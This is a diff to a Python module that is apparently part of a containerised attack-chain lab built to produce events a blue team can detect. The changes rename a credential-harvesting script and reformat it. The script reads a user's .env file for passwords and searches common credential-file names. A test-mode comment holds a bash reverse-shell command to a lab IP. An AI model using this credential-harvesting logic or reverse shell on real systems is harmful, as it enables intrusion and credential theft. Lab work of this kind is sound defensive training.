@@ -6,7 +6,7 @@ import time
 from chainlog import log, run_remote
 
 # =============================================================================
-# credential_stuffing.py — Discover internal credentials from john's .env
+# credential_access.py — Discover internal credentials from john's .env
 # MITRE ATT&CK:
 #   T1552.001 – Credentials In Files     (read john's ~/.env on apache)
 # -----------------------------------------------------------------------------
@@ -16,7 +16,7 @@ from chainlog import log, run_remote
 # handled in lateral_movement.py.
 # =============================================================================
 
-ENV_FILE_PATH   = "/home/john.stravidis/.env"
+ENV_FILE_PATH = "/home/john.stravidis/.env"
 TARGET_USERNAME = "john.stravidis"
 
 # Noise file patterns searched before the real .env read (T1552.001).
@@ -24,14 +24,22 @@ TARGET_USERNAME = "john.stravidis"
 # expected to come up empty — the point is to generate observable events in
 # the scenario log and the apache shell history that a blue team can correlate.
 _NOISE_FILE_PATTERNS = [
-    ("passwords.txt",   ["/home", "/root", "/tmp", "/var/www", "/opt"]),  # /var/www: web-app credential dumps
-    ("secrets.json",    ["/home", "/root", "/tmp", "/var/www", "/opt"]),  # /var/www: web-app credential dumps
-    ("config.backup",   ["/home", "/root", "/tmp", "/etc",     "/opt"]),  # /etc: sysadmin backup destination
-    ("credentials.txt", ["/home", "/root", "/tmp",             "/opt"]),
-    (".passwd",         ["/home", "/root",                     "/opt"]),
-    ("db_password.txt", ["/home", "/root",                     "/opt"]),
+    (
+        "passwords.txt",
+        ["/home", "/root", "/tmp", "/var/www", "/opt"],
+    ),  # /var/www: web-app credential dumps
+    (
+        "secrets.json",
+        ["/home", "/root", "/tmp", "/var/www", "/opt"],
+    ),  # /var/www: web-app credential dumps
+    (
+        "config.backup",
+        ["/home", "/root", "/tmp", "/etc", "/opt"],
+    ),  # /etc: sysadmin backup destination
+    ("credentials.txt", ["/home", "/root", "/tmp", "/opt"]),
+    (".passwd", ["/home", "/root", "/opt"]),
+    ("db_password.txt", ["/home", "/root", "/opt"]),
 ]
-
 
 
 def _extract_password(env_text, var_names=("WS_PASS", "JOHN_PASS", "PASSWORD")):
@@ -69,7 +77,7 @@ def _search_noise_files(shell):
         )
         out = run_remote(shell, cmd, timeout=10)
         hits = [
-            line[len("CS_NOISE_HIT "):]
+            line[len("CS_NOISE_HIT ") :]
             for line in out.splitlines()
             if line.startswith("CS_NOISE_HIT ")
         ]
@@ -115,7 +123,7 @@ def run(root_shell, target_user=TARGET_USERNAME):
 
 
 # Test mode — same pattern as the other chain modules.
-# Usage: docker compose exec kali python3 /Attack-chain/credential_stuffing.py
+# Usage: docker compose exec kali python3 /Attack-chain/credential_access.py
 # Then in another terminal, on apache:
 #   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
 if __name__ == "__main__":
